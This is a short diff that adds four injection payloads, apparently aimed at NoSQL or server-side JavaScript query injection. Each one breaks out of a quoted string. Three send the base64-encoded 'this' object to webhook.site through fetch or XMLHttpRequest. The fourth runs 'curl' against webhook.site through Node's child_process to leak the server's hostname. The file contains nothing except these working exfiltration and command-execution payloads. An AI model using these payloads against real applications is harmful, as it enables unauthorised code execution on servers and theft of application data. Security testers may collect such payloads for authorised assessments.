@@ -1,0 +1,4 @@
+' && (function(){ fetch('http://webhook.site/test/'+btoa(JSON.stringify(this))) })() && '1'=='1
+' || (function(){ fetch('http://webhook.site/test/'+btoa(JSON.stringify(this))) })() || '1'=='1
+' && (function(){ const x = new XMLHttpRequest(); x.open('GET', 'http://webhook.site/test/' + btoa(JSON.stringify(this)), false); x.send(); })() && '1'=='1
+' && process.mainModule.require('child_process').exec('curl http://webhook.site/test/$(hostname)') && '1'=='1
